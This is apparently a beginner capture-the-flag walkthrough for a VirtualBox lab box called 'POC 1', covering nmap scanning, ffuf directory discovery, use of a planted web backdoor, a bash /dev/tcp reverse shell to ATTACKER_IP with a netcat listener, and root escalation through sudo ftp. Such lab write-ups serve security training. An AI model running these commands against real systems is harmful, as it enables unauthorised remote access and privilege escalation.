
Documentation for the first box of the POC serie, a beginer box used to familarize with pentest tools and procedures.


# BOX POC 1

For this box, only an OVA for a virtual machine is provided, where I can see IP for beginning my pentest : 192.168.56.104, I put this in an $ip var.

---

## Summary

1. [Scan](#scan)
2. [website inspection](#website-inspection)
3. [Web Enumeration](#Web-Enumeration)
4. [Backdoor](#Backdoor)
5. [Reverse shell](#Reverse-shell)
6. [Sudo permission](#Sudo-permission)

---

## Scan

We begin with a classic discovery of the network with this nmap command : ```nmap -sS -sV -sC -T4 $ip```

<details>
  
<summary>nmap command detail</summary>

The nmap command is a must-have, used to perform a discovery of the targeted network, it litteraly "map" it as it's name says, some options can make this mapping acting differently as we need a more stealthier and/or complete mapping, here is the detail of the command I choose to use :

-sS
Performs a SYN scan (also called a "stealth scan").
It sends SYN packets to discover open ports without completing the TCP handshake, making it faster and less detectable than a full connect scan.

-sV
Enables service version detection.
Nmap will try to identify the version and name of the services running on the open ports.

-sC
Runs default NSE scripts (--script=default).
These scripts perform common enumeration tasks such as checking for vulnerabilities, retrieving banner info, and more.

-T4
Sets the timing template to "Aggressive".
This makes the scan significantly faster while remaining relatively stable on most networks.

$ip
The target IP address.
Replace this with the actual IP of the target machine during execution.

The basic scan is used to test a thousand of the most used and vulnerable ports, but we can specify a range of ports to targett too, or even just select them all with the ```-p-``` argument, but be warned that this maping can become much more slow and noisy in the network targetted.

[More info on the documentation of nmap](https://nmap.org/docs.html)

</details>

Here is the result on my attacking device :

```
nmap -sS -sV -sC -T4 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-15 11:46 CEST
Nmap scan report for 192.168.56.104
Host is up (0.00016s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Hacked By Lazy Hackers
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:49:E3:86 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

<details>
  
<summary>scan explanation</summary>

We have a bunch of details such as targetted IP, we can see the host is up, and that 999 tcp ports are not shown because closed. But the main course is that http port (80) is open and with a website running with it. We can see more information on the targetted device, this is a debian, using Apache, we have the versionning and the MAC adress too, using Vbox, where the OVA of the box is virtualised.

</details>

So the first thing I do after this mapping is to go check this website 


## website inspection

When trying to connect to the website with my browser on 192.168.53.104:80, we arrive on a "hacked" page, after using the inspect tool, I quickly find the first flag : 

<img width="1283" height="826" alt="POC1_FLAG1" src="https://github.com/user-attachments/assets/cca54507-c79d-45eb-8786-50c8eadc207b" />

Here we can see a hint for the next flag "Web Enumeration"


## Web Enumeration

For the web enumeration I choose to use the tool ffuf.

<details>
  
<summary>ffuf utility</summary>

FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzing tool used for discovering hidden directories, files, or parameters on web servers. Its speed and support for complex payload injection (e.g., multiple wordlists, custom headers) make it stand out from other enumeration tools. It's particularly useful for web application reconnaissance during CTFs and penetration tests.

We can specify some parameters using ffuf, such as :

- Timeout: By default, requests will timeout after 10 seconds if the server doesn’t respond.

- Threads: By default, FFUF uses 40 parallel threads, speeding up the fuzzing process by sending multiple requests simultaneously.

- Matcher: By default, FFUF considers responses with specific HTTP status codes (e.g., 200, 403, 301...) as valid or interesting.


[Here is the git of ffuf](https://github.com/ffuf/ffuf)

</details>

So here is my ffuf command :

```
ffuf -c -w '/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt' -u "http://$ip/FUZZ" 
```

<details>
  
<summary>ffuf command details</summary>

This command uses FFUF to brute-force hidden web paths on the target server.

-w specifies the wordlist to use (big.txt from SecLists on my exegol container).

-u sets the target URL, replacing FUZZ with each word from the list. Here I simply started my fuzzing at the root of the website.

-c enables colored output for better readability.

</details>


And here is the result :

```   
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 8ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 222ms]
backdoor                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [20478/20478] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Here we can see the obvious "backdoor" result so I choose to test this on ```http://192.168.56.104/backdoor/``` and we arrive on a command prompt :

<img width="1328" height="385" alt="POC1_Prompt" src="https://github.com/user-attachments/assets/ff270dda-6bbc-4a7d-a2e6-357c212f5f9f" />

And it seems that we are logged as 'www-data'.


## Backdoor

I test a first command to discover where I am and I found directly the second flag :

<img width="1314" height="393" alt="POC1_Prompt_ls" src="https://github.com/user-attachments/assets/697337c7-6dc0-455c-b13e-bcbca36a4c98" />

```FLAG2{OU-SE-TROUVE-LES-DOSSIERS-PERSONNELS-DES-UTILISATEURS?}```

With a hint for the next flag "where is the personnal files of users"

Then I try to list the home file with ```ls /home/``` and here I see a user named Alix, and inside the home of Alix, the third flag prompted with this command : ```cat /home/alix/FLAG3.txt/```

<img width="1152" height="237" alt="POC1_Prompt_flag3" src="https://github.com/user-attachments/assets/2240dbe9-2848-4fa3-bedc-f0edc31a887f" />

With another hint "C'est quoi cette chaîne U1VETy1QRVJNSVNTSU9OLXwtWU9VLU5FRUQtQS1SRVZFUlNFLVNIRUxMCg== ? du base64 ?" asking what is this chain, maybe base64 ?

So I ask my precious AI assistant to decode this and this is a message saying ```SUDO-PERMISSION ~ YOU NEED A REVERSE SHELL/```


## Reverse shell

I need a reverse shell, and I already have a RCE, so I'm just going to open a reverse shell in bash. First I need to listen with my attacking PC using netcat : ```nc -lvnp 4444```

<details>
  
<summary>nc command details</summary>

```nc -lvnp 4444```

netcat command using the following parameters :

l = listen

v = verbose

n = no DNS

p = port

4444 = port used to listening (we can change the port as we want)

</details>


Then I put this command in my RCE to redirect the shell that I open : ```bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'```


<details>

<summary>reverse shell command details</summary>

This command is used to launch a bash with those parameters :

- ```bash -i``` : Lance Bash en mode interactif (-i).

- ```>& /dev/tcp/ATTACKER_IP/4444``` : redirect output and errors to a TCP connexion, openning a socket toward the specified IP and port. 

- ```0>&1``` : Redirect entry to the same destination

So basicaly this is used to send commands toward the targetted device and thoses are treated by the shell like a classic one of the attacking PC.


</details>

And here is my attacking machine listening :

```
nc -lvnp 4444 

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.104.
Ncat: Connection from 192.168.56.104:60146.
bash: cannot set terminal process group (448): Inappropriate ioctl for device
bash: no job control in this shell
www-data@CTF-NOSTALGY-PIECE-OF-CAKE:/var/www/html/backdoor$
```

I do now have a reverse shell working, logged as www-data.

## Sudo permission

As the hint say, we should try searching the sudo permission that www-data may have, to abuse thoses permissions for escalating toward a more powerfull and limitless account or service inside the environement, because as a www-data account, usualy used as a very limited access account, I can't go further.

Firstly I check the permissions that my account may have with the command ```sudo -l```, here is the result :

```
sudo -l
sudo: unable to resolve host CTF-NOSTALGY-PIECE-OF-CAKE: Temporary failure in name resolution
Matching Defaults entries for www-data on CTF-NOSTALGY-PIECE-OF-CAKE:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on CTF-NOSTALGY-PIECE-OF-CAKE:
    (root) NOPASSWD: /usr/bin/ftp
```

As I can see, it seems that I may have unrestricted access to ```/usr/bin/ftp```, a binary file that I can execute in root, this is a reflect (way easier than what we found usualy IRL) to abusing bad configurated permission. FTP is "file transfer protocol" a very popular tool, that let me great flexibility for escalating.

With access to a bin file, I go to this website, searching FTP abuse that I can find ```https://gtfobins.github.io/```

And here is what interest me :

```
Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```

And here is the only two commands I need to use for escalating :

```
sudo ftp
!/bin/sh
```

I simply execute ftp on sudo privilege, and then I simply open a shell, with sudo permission, letting me with a very ugly but powerfull root shell:

```
whoami
root
```

I do now have total control over the target, searching the last flag, I check the root home and see it :

```
ls /root/
FLAG4.txt
cat /root/FLAG4.txt
FLAG4{BRAVO-TU-AS-REUSSI-CE-CTF-!!!}


░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

